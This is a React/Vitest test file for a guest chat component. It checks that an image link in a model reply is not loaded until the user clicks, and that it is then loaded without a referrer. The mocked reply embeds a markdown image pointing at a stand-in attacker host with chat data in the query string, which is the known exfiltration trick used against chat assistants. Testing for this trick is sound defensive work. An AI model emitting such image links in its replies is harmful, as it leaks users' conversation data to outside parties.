import type React from 'react';
import { describe, expect, it, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

type GuestChatStreamModule = typeof import('./guest-chat-stream');

const ATTACKER_HOST = 'attacker.example';
const REPLY_IMAGE_URL = `https://${ATTACKER_HOST}/p?d=summary-of-the-chat`;
const REPLY = `Here is your summary.\n\n![chart](${REPLY_IMAGE_URL})`;
const ASSET_TIMEOUT_MS = 15_000;

vi.mock('./guest-chat-stream', async (importOriginal) => ({
  ...(await importOriginal<GuestChatStreamModule>()),
  sendGuestTurn: async (
    _messages: unknown,
    _signal: AbortSignal,
    onText: (content: string) => void,
  ) => {
    onText(REPLY);
    return { content: REPLY, failure: null, remaining: 4 };
  },
}));

vi.mock('next/link', () => ({
  default: ({
    children,
    href,
    className,
  }: {
    children: React.ReactNode;
    href: string;
    className?: string;
  }) => (
    <a href={href} className={className}>
      {children}
    </a>
  ),
}));

const { GuestChat } = await import('./GuestChat');

describe('GuestChat', () => {
  it(
    'asks before loading an image that a guest reply points at',
    async () => {
      const user = userEvent.setup();
      const { container } = render(
        <GuestChat dailyLimit={5} signInHref="/login" signUpHref="/sign-up" />,
      );

      await user.type(screen.getByRole('textbox', { name: 'Message input' }), 'Summarise it');
      await user.keyboard('{Enter}');

      const load = await screen.findByRole(
        'button',
        { name: `Load image from ${ATTACKER_HOST}` },
        { timeout: ASSET_TIMEOUT_MS },
      );
      expect(container.querySelector('img')).toBeNull();
      expect(container.innerHTML).not.toContain(`${ATTACKER_HOST}/p`);

      await user.click(load);

      const image = container.querySelector('img');
      expect(image?.getAttribute('src')).toBe(REPLY_IMAGE_URL);
      expect(image?.getAttribute('referrerpolicy')).toBe('no-referrer');
    },
    ASSET_TIMEOUT_MS * 2,
  );
});
